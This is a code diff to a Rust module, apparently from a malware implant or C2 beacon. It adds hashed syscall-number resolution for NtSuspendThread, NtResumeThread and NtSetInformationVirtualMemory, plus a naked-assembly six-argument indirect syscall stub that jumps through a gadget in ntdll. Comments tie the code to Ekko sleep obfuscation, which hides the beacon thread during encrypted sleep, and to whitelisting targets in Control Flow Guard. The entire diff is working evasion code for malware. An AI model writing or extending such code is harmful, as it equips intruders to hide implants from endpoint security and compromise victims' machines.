@@ -37,6 +37,46 @@ const DELAY_EXECUTION: (u64, u64) = syscalls::hash_nt_or_zw("NtDelayExecution");
 const GET_CONTEXT_THREAD: (u64, u64) = syscalls::hash_nt_or_zw("NtGetContextThread");
 const SET_CONTEXT_THREAD: (u64, u64) = syscalls::hash_nt_or_zw("NtSetContextThread");
 const PROTECT_VIRTMEM: (u64, u64) = syscalls::hash_nt_or_zw("NtProtectVirtualMemory");
+const SUSPEND_THREAD: (u64, u64) = syscalls::hash_nt_or_zw("NtSuspendThread");
+const RESUME_THREAD: (u64, u64) = syscalls::hash_nt_or_zw("NtResumeThread");
+const SET_INFORMATION_VIRTMEM: (u64, u64) =
+    syscalls::hash_nt_or_zw("NtSetInformationVirtualMemory");
+
+/// SSN of `NtSuspendThread` — the Ekko worker parks the beacon thread
+/// on the donor stack for the encrypted window.
+///
+/// # Safety
+///
+/// `ntdll` must be a valid mapped ntdll image.
+pub unsafe fn suspend_thread_ssn(ntdll: *mut c_void) -> Option<u32> {
+    let mut zw = ZwStubs::new();
+    syscalls::collect_zw_stubs(ntdll, &mut zw);
+    ssn_of(ntdll, &zw, SUSPEND_THREAD)
+}
+
+/// SSN of `NtResumeThread`.
+///
+/// # Safety
+///
+/// `ntdll` must be a valid mapped ntdll image.
+pub unsafe fn resume_thread_ssn(ntdll: *mut c_void) -> Option<u32> {
+    let mut zw = ZwStubs::new();
+    syscalls::collect_zw_stubs(ntdll, &mut zw);
+    ssn_of(ntdll, &zw, RESUME_THREAD)
+}
+
+/// SSN of `NtSetInformationVirtualMemory` — the Ekko CFG whitelist marks
+/// the threadpool worker and the donor proc as valid indirect-call
+/// targets (VmCfgCallTargetInformation, the native SptCfgAddTarget).
+///
+/// # Safety
+///
+/// `ntdll` must be a valid mapped ntdll image.
+pub unsafe fn set_information_virtmem_ssn(ntdll: *mut c_void) -> Option<u32> {
+    let mut zw = ZwStubs::new();
+    syscalls::collect_zw_stubs(ntdll, &mut zw);
+    ssn_of(ntdll, &zw, SET_INFORMATION_VIRTMEM)
+}
 
 /// SSN of `NtProtectVirtualMemory` — the sleep mask flips its image
 /// ranges writable for the encrypted window (RX-mapped payloads).
@@ -246,4 +286,87 @@ pub unsafe fn exit_thread(exit: unsafe extern "system" fn(u32)) -> ! {
     loop {
         core::hint::spin_loop();
     }
+}
+
+/// Argument block for the 6-argument indirect syscall stub.
+#[repr(C)]
+pub struct Syscall6 {
+    pub rcx: usize,    // +0x00
+    pub rdx: usize,    // +0x08
+    pub r8: usize,     // +0x10
+    pub r9: usize,     // +0x18
+    pub arg5: usize,   // +0x20 (written to the fifth-argument stack slot)
+    pub arg6: usize,   // +0x28 (written to the sixth-argument stack slot)
+    pub ssn: u32,      // +0x30
+    pub gadget: usize, // +0x38
+}
+
+/// Six-argument indirect syscall stub — same explicit-frame contract as
+/// `spt_syscall5`, with the sixth argument at [rsp+0x28].
+///
+/// # Safety
+///
+/// `block` must be fully initialized: a valid syscall number and a
+/// `syscall; ret` gadget address inside ntdll.
+#[unsafe(naked)]
+#[unsafe(no_mangle)]
+pub unsafe extern "C" fn spt_syscall6(block: usize) -> usize {
+    naked_asm!(
+        "push rbx",
+        "push rbp",
+        "push rdi",
+        "push r14",
+        "sub  rsp, 0x38",
+        "mov  r14, rcx", // block (callee-saved across the call)
+        "mov  rcx, [r14 + 0x00]",
+        "mov  rdx, [r14 + 0x08]",
+        "mov  r8,  [r14 + 0x10]",
+        "mov  r9,  [r14 + 0x18]",
+        "mov  rax, [r14 + 0x20]",
+        "mov  [rsp + 0x20], rax", // fifth argument slot (own frame)
+        "mov  rax, [r14 + 0x28]",
+        "mov  [rsp + 0x28], rax", // sixth argument slot
+        "mov  eax, [r14 + 0x30]", // SSN
+        "mov  r10, rcx",          // syscall ABI: arg1 -> r10
+        "mov  r11, [r14 + 0x38]", // gadget
+        "call r11",
+        "add  rsp, 0x38",
+        "pop  r14",
+        "pop  rdi",
+        "pop  rbp",
+        "pop  rbx",
+        "ret",
+    );
+}
+
+/// Execute an indirect syscall with 6 arguments through the naked stub.
+/// The status (NTSTATUS) is returned.
+///
+/// # Safety
+///
+/// `ssn` must be a valid syscall number and `gadget` a `syscall; ret`
+/// address inside ntdll; pointer arguments must be valid for the syscall.
+#[allow(clippy::too_many_arguments)]
+#[inline(always)]
+pub unsafe fn indirect_syscall6(
+    ssn: u32,
+    gadget: *const c_void,
+    rcx: usize,
+    rdx: usize,
+    r8: usize,
+    r9: usize,
+    arg5: usize,
+    arg6: usize,
+) -> i32 {
+    let block = Syscall6 {
+        rcx,
+        rdx,
+        r8,
+        r9,
+        arg5,
+        arg6,
+        ssn,
+        gadget: gadget as usize,
+    };
+    spt_syscall6(core::ptr::from_ref(&block) as usize) as i32
 }
